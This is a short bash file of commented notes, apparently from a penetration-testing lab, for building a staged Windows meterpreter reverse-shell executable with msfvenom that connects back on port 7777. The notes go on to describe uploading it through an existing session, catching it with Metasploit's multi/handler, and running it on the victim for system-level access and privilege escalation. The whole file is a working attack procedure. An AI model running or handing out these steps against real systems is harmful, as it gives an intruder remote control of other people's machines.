#! /bin/bash

# generate a windows reverse shell(staged) to give us meterpreter, which will connect back to
# us on port 7777

# checking available options
msfvenom --list-options -p windows/meterpreter/reverse_tcp 

# payload to be generated on attacker's machine using this command(general pattern)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.67.234 LPORT=7777 -f exe > shell.exe

# NOTE : this will be used in privilege escalation too
# let's say we have some unstable shell / less privileged shell/meterpreter session
# after creating "shell.exe" , we can upload this into the machine with the help of our current session(using upload command or ftp)

# now we will open msfconsole in another windows , and do "use exploit/multi/handler"(it handles exploit launched outside of the framework)
# show options
# set LHOST=attacker ip(same as in payload) , LPORT=7777(same as in payload)
# exploit

# after uploading we will do , "execute shell.exe" on windows(victim) machine through a meterpreter shell, to gain system level access
